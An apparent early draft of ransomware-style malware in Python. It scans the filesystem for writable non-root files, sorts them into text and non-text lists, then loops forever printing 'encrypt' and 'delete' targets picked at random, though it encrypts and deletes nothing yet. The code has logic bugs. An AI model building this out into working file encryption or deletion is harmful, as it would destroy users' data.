import os
import random
import pathlib
import time
import colorama
from colorama import Fore, Back, Style
colorama.init()
  
############################################################################################################################################################

Files_Table = [] #a table contaning all writable files
Text_Files_Table = [] #a table contaning all writable TEXT files
NonText_Files_Table = []#a table contaning all writable Non-TEXT files
theroot = "none" #just to check if we have a root file in a directory

for (root,dirs,files) in os.walk('/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
	print(files) #print all the files found in that directory
	print ('--------------------------------')
	
	for file in files: #goes through all the files
		path = os.path.join(root, file) #this part is to save a root file if found (just for testing, will be removed later)
		if os.path.isfile(path) == True:
			if os.stat(path).st_uid == 0:
				theroot = os.stat(path)
			
		if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be open we ignore it
		else:
			if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
				Files_Table.append(path) #put all writable files in the list
				if(pathlib.Path(path).suffix == ".txt"):
					Text_Files_Table.append(path) #put all writable TEXT files in the list	
				
for i in range(0,(len(Files_Table)-1)):
	trouve = False
	j=0
	while((trouve == False) and (j<len(Text_Files_Table)-1)):
		if (Files_Table[i] == Text_Files_Table[j]):
			trouve = True
		j=j+1
	if trouve == False:
		NonText_Files_Table.append(Files_Table[i])

print(Fore.BLUE+ "these are to modifiable files: ")				
print(Files_Table)
print(Fore.CYAN+ "these are to TEXT modifiable files: ")				
print(Text_Files_Table)
print(Fore.RED+ "these are to Non-TEXT modifiable files: ")				
print(NonText_Files_Table)
print(Fore.GREEN + "one of the root files " + str(theroot))


while True:
	randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
	randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
	randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1

	print("encrypt: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
	time.sleep(5)
	print("delete: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
	time.sleep(5)
	print("add file: " +  str(randomeNumberOfFiles))
   
